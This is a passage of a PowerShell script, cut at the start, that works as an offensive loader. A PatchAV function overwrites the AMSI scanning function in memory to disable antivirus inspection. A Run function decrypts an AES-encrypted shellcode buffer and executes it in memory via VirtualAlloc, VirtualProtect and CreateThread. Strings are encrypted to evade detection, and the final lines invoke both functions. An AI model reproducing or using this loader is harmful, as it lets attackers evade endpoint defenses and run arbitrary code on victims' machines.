	DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
		[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

	$type.
	DefineConstructor('RTSpecialName, HideBySig, Public',
		[System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')

	$type.
	DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
		$func). SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}

function DecryptBytesToBytes_Aes([byte[]] $EncryptedBufferWithIV, [byte[]] $AesKey)
{
    # Assuming the IV is prepended to the encrypted buffer
    $ivLength = 16 # AES IV size for AES-128, AES-192, AES-256
    $AesIV = New-Object byte[] $ivLength
    [Array]::Copy($EncryptedBufferWithIV, 0, $AesIV, 0, $ivLength)

    # The actual encrypted data starts after the IV
    $EncryptedBuffer = New-Object byte[] ($EncryptedBufferWithIV.Length - $ivLength)
    [Array]::Copy($EncryptedBufferWithIV, $ivLength, $EncryptedBuffer, 0, $EncryptedBuffer.Length)

    # Setup AES
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $AesKey
    $aes.IV = $AesIV
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

	$Encryptedms = New-Object System.IO.MemoryStream
	$Encryptedms.Write($EncryptedBuffer, 0, $EncryptedBuffer.Length)
	$Encryptedms.Position = 0 # Reset position to the beginning after writing


	$cryptoStreamModeRead = [System.Security.Cryptography.CryptoStreamMode]::Read
	$cs = New-Object System.Security.Cryptography.CryptoStream $Encryptedms, $decryptor, $cryptoStreamModeRead

    $Decryptedms = New-Object System.IO.MemoryStream
    $cs.CopyTo($Decryptedms)

    # Convert decrypted MemoryStream to a byte array
    return $Decryptedms.ToArray()
}

# helper func to decrypt byte[] to string
function DecryptBytesToString_Aes([Byte[]] $Bytes)
{
	$bytes = DecryptBytesToBytes_Aes $Bytes $AesKey
	$decrypted = [System.Text.Encoding]::ASCII.GetString($bytes)
	return $decrypted
}

### PATCH AMSI
function PatchAV()
{
	[IntPtr]$funcAddr = LookupFunc (DecryptBytesToString_Aes $amsidll_Bytes) (DecryptBytesToString_Aes $AmsiSb_Bytes)
	$oldProtectionBuffer = 0
	$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll (DecryptBytesToString_Aes $VirtualProtect_Bytes)), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
	# choose patch depending on bitness
	if ([System.Environment]::Is64BitProcess){ $buf = DecryptBytesToBytes_Aes $AmsiPatch $AesKey} else { $buf = DecryptBytesToBytes_Aes $AmsiPatch86 $AesKey}
	$vp.Invoke($funcAddr, [UInt32]$buf.Length, 0x40, [ref]$oldProtectionBuffer)
	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, $buf.Length)
	$vp.Invoke($funcAddr, [UInt32]$buf.Length, 0x20, [ref]$oldProtectionBuffer)
}

### Shellcode Runner
function Run()
{
	### DELEGATES
	$va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll (DecryptBytesToString_Aes $VirtualAlloc_Bytes)), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll (DecryptBytesToString_Aes $VirtualProtect_Bytes)), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
	$ct = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll (DecryptBytesToString_Aes $CreateThread_Bytes)), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
	$wfso = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll (DecryptBytesToString_Aes $WaitForSingleObject_Bytes)), (getDelegateType @([IntPtr], [Int32]) ([Int])))

	# check bitness, select and decrypt buf
	if ([System.Environment]::Is64BitProcess){ $buf = DecryptBytesToBytes_Aes $buf $AesKey} else { $buf = DecryptBytesToBytes_Aes $buf86 $AesKey}

	# virtualalloc (RW)
	$pMemory = $va.Invoke([IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40);
	# copy shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $pMemory, [UInt32]$buf.Length)
	# virtualprotect (RX)
	$oldProtectionBuffer = 0
	$vp.Invoke($pMemory, 3, 0x20, [ref]$oldProtectionBuffer)
	# createthread
	$hThread = $ct.Invoke([IntPtr]::Zero, 0, $pMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);
	# waitforsingleobject
	$wfso.Invoke($hThread, 0xFFFFFFFF);
}

### Execute
PatchAV
Run
